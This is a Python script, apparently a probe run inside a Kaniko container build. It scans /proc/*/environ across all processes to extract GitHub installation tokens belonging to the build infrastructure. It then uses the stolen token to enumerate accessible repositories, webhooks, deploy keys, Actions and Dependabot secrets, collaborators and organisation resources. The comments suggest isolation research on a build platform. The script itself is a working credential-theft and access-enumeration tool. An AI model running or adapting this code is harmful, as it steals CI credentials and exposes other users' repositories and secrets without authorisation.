import json, os, urllib.request, urllib.error, ssl, re, glob

r = {}
ctx = ssl.create_default_context()

# 1. Find the GitHub token from ANY process environment
token = None

# Check own env first
git_url = os.environ.get('GIT_SOURCE_URL', '')
if git_url:
    match = re.search(r'x-access-token:([^@]+)@', git_url)
    if match:
        token = match.group(1)
        r['token_source'] = 'own_env'

# Check all process environs (we run as root in Kaniko builds)
if not token:
    for pid_dir in sorted(glob.glob('/proc/[0-9]*'), key=lambda x: int(x.split('/')[-1])):
        pid = pid_dir.split('/')[-1]
        try:
            environ = open(f'/proc/{pid}/environ').read()
            match = re.search(r'x-access-token:([^@\x00]+)@', environ)
            if match:
                token = match.group(1)
                r['token_source'] = f'pid_{pid}'
                break
            # Also check for bare ghs_ tokens
            match2 = re.search(r'(ghs_[A-Za-z0-9]{30,})', environ)
            if match2:
                token = match2.group(1)
                r['token_source'] = f'pid_{pid}_bare'
                break
        except:
            pass

if not token:
    r['error'] = 'No GitHub token found in any process'
    print(json.dumps(r, indent=2))
    exit()

r['token_prefix'] = token[:12] + '...'
r['token_len'] = len(token)

headers = {
    'Authorization': f'token {token}',
    'Accept': 'application/vnd.github+json',
    'User-Agent': 'probe/1.0'
}

def gh(path):
    try:
        req = urllib.request.Request(f'https://api.github.com{path}', headers=headers)
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        data = json.loads(resp.read().decode())
        scopes = resp.headers.get('X-OAuth-Scopes', '')
        return {'s': resp.status, 'd': data, 'scopes': scopes}
    except urllib.error.HTTPError as e:
        return {'s': e.code, 'e': e.read().decode(errors='replace')[:200]}
    except Exception as e:
        return {'err': str(e)[:100]}

# ============================================================
# 2. TOKEN IDENTITY
# ============================================================

# What scopes/permissions does this token have?
r['whoami'] = gh('/user')

# GitHub App info
r['app_info'] = gh('/app')

# Rate limit shows auth type
r['rate'] = gh('/rate_limit')

# ============================================================
# 3. INSTALLATION SCOPE — what repos can we access?
# ============================================================

# List repos accessible to this installation token
r['install_repos'] = gh('/installation/repositories?per_page=100')

# ============================================================
# 4. REPO ACCESS TESTS
# ============================================================

# Own repo (the one being built)
r['own_repo'] = gh('/repos/rollingWaves/build-imds-test')

# Other repos in same account
r['other_repo'] = gh('/repos/rollingWaves/build-bp-test')

# Foreign repo (should be 404 or limited)
r['foreign'] = gh('/repos/torvalds/linux')

# ============================================================
# 5. WRITE/ADMIN ACCESS on own repo
# ============================================================

# Webhooks (admin access indicator)
r['hooks'] = gh('/repos/rollingWaves/build-imds-test/hooks')

# Deploy keys
r['deploy_keys'] = gh('/repos/rollingWaves/build-imds-test/keys')

# Secrets (Actions)
r['secrets'] = gh('/repos/rollingWaves/build-imds-test/actions/secrets')

# Collaborators
r['collabs'] = gh('/repos/rollingWaves/build-imds-test/collaborators')

# Contents (read source code)
r['contents'] = gh('/repos/rollingWaves/build-imds-test/contents/')

# Branches + protection
r['branches'] = gh('/repos/rollingWaves/build-imds-test/branches')

# Issues
r['issues'] = gh('/repos/rollingWaves/build-imds-test/issues')

# Pull requests
r['pulls'] = gh('/repos/rollingWaves/build-imds-test/pulls')

# Environments
r['envs'] = gh('/repos/rollingWaves/build-imds-test/environments')

# Workflow runs
r['workflows'] = gh('/repos/rollingWaves/build-imds-test/actions/runs?per_page=1')

# ============================================================
# 6. DANGEROUS OPERATIONS (read-only probing)
# ============================================================

# Can we access org-level resources?
r['orgs'] = gh('/user/orgs')

# Can we list ALL user installations?
r['installations'] = gh('/user/installations?per_page=5')

# Can we see other users' repos via search?
r['search'] = gh('/search/repositories?q=user:rollingWaves&per_page=5')

# Can we access GitHub Actions variables?
r['variables'] = gh('/repos/rollingWaves/build-imds-test/actions/variables')

# Dependabot secrets
r['dependabot'] = gh('/repos/rollingWaves/build-imds-test/dependabot/secrets')

# ============================================================
# 7. CHECK TOKEN PERMISSIONS VIA HEADER
# ============================================================
try:
    req = urllib.request.Request('https://api.github.com/', headers=headers)
    resp = urllib.request.urlopen(req, timeout=5, context=ctx)
    r['token_headers'] = {
        'X-OAuth-Scopes': resp.headers.get('X-OAuth-Scopes', 'none'),
        'X-Accepted-OAuth-Scopes': resp.headers.get('X-Accepted-OAuth-Scopes', 'none'),
        'X-GitHub-Media-Type': resp.headers.get('X-GitHub-Media-Type', ''),
    }
    resp.read()
except Exception as e:
    r['token_headers'] = str(e)[:100]

print(json.dumps(r, indent=2, default=str))
